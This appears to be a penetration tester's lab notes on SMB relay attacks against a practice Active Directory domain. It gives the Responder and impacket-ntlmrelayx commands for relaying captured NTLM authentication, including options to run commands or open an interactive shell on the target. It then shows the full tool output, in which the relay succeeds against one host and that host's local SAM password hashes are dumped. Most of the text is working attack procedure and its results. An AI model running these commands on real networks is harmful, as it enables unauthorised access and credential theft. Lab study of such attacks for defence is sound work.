
Instead of capturing hashes you can relay those hashes and get access

Requirements:
- SMB signing must be disabled or not enforced
- Rlayed user credentials **must** be **admin** on machine for any real value



use this script

```
nmap --script=smb2-security-mode-nse -p445
```

now we need to configure responder
then setup responder and make sure that http and smb are off

```
sudo responder -I eth0 -dwP
```

```
impacket-ntlmrelayx -tf targets.txt -smb2support
```



and then easy win we should be abel to get the hashes of the same here



```
kali@kali ~> sudo responder -I eth0 -dP
kali@kali ~> nmap -sV -Pn --script=smb2-security-mode.nse 192.168.176.130 -p445
kali@kali ~> impacket-ntlmrelayx -t smb://192.168.176.130 -smb2support
kali@kali ~> impacket-ntlmrelayx -tf target.txt -smb2support
kali@kali ~> impacket-ntlmrelayx -tf target.txt -smb2support -c "whoami"
kali@kali ~> impacket-ntlmrelayx -tf target.txt -smb2support -i
```


```
kali@kali ~> impacket-ntlmrelayx -tf target.txt -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, attacking target smb://192.168.176.130
[-] Authenticating against smb://192.168.176.130 as MARVEL/FCASTLE FAILED
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, attacking target smb://192.168.176.131
[*] Authenticating against smb://192.168.176.131 as MARVEL/FCASTLE SUCCEED
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, attacking target smb://192.168.176.130
[-] Authenticating against smb://192.168.176.130 as MARVEL/FCASTLE FAILED
[*] SMBD-Thread-8 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] SMBD-Thread-9 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, but there are no more targets left!
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-10 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, but there are no more targets left!
[*] SMBD-Thread-11 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, but there are no more targets left!
[*] SMBD-Thread-12 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.176.130 controlled, but there are no more targets left!
[*] Target system bootKey: 0xc1faf23a42a8e2805ccfa6d456b1b1f5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2e7457185c1176db9ff521fa8512aa29:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.176.131
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

